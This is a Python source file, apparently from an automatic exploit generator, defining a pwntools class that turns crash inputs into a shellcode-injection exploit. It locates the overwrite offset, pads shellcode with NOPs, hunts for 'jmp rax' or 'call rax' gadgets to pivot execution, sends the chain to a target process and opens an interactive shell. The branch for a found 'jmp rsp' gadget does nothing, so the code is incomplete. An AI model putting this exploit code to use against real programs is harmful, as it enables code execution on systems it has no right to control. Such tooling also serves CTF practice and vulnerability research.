from pwn import *
from elftools.elf.segments import Segment
from binary.shellcode import Shellcode

# context.log_level = 'DEBUG'


class ShellcodeExploiter:
    def __init__(self, binary, vuln_details):
        self.binary = binary
        context.binary = self.binary.elf
        self.output = b""
        self.last_output = b""
        self.inputs = []
        self.control_after_ret = 0
        self.control_before_ret = 0
        self.parse_vuln(vuln_details)
        self.shellcode = Shellcode(self.binary)

    def parse_vuln(self, vuln_details):
        print(vuln_details)
        self.control_after_ret = vuln_details["control_after_ret"]
        self.control_before_ret = vuln_details["control_before_ret"]
        self.inputs = vuln_details["input"]
        self.output = vuln_details["output"]

    def exploit_input(self, input, rop):
        ip = b"X" * self.binary.elf.bytes
        chain_length = len(input)
        log.info("total payload length: {}".format(chain_length))
        offset = input.index(ip)
        log.info("buffer offset: {}".format(offset))
        exploit_entry_input = input[0:offset]

        jmp_rsp = self.binary.find_bytes(asm('jmp rsp'))

        if jmp_rsp is None:
            pivot_rax = self.binary.find_bytes(asm('jmp rax'))
            if pivot_rax is None:
                pivot_rax = self.binary.find_bytes(asm('call rax'))
            nop = asm(shellcraft.nop())
            rop.raw(self.shellcode.content.ljust(offset, nop))
            rop.raw(pivot_rax)

    def apply_crash_input(self, process, rop):
        current_output = b""
        for i, input in enumerate(self.inputs):
            current_output += process.clean_and_log()
            ip = b"X" * self.binary.elf.bytes
            if ip not in input:
                process.send(input)
            else:
                self.exploit_input(input, rop)
                chain = rop.chain()
                process.sendline(chain)

        current_output += process.clean_and_log()
        log.info("current output: {}".format(current_output))
        self.last_output = self.output.replace(current_output, b"")
        log.info("last output: {}".format(self.last_output))

    def exploit(self):
        process = self.binary.elf.process()
        # process = gdb.debug(self.binary.bin_path, '''break main''')

        rop = ROP([self.binary.elf])
        self.apply_crash_input(process, rop)

        process.interactive()
